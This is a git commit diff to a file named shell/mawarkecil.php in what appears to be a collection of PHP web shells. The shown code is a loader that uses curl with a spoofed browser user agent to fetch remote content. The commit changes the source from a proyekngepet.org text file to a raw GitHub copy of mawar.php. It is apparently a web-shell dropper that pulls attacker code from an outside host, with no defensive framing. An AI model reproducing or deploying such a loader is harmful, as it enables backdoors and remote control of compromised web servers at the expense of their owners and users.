4eeb72fe0173b5c8bfa80a0dd214aac4ade08301
sajapastipasti-afk <sajapastipasti@gmail.com>
2026-07-21 12:25:59 +0700

    Update mawarkecil.php

--- shell/mawarkecil.php
+++ shell/mawarkecil.php
@@ -1,5 +1,5 @@
 <?php
-$ch = curl_init('https://project1.proyekngepet.org/ashborn/shell/mawarasli.txt');
+$ch = curl_init('https://raw.githubusercontent.com/sajapastipasti-afk/assets/refs/heads/main/shell/mawar.php');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
 $content = curl_exec($ch);
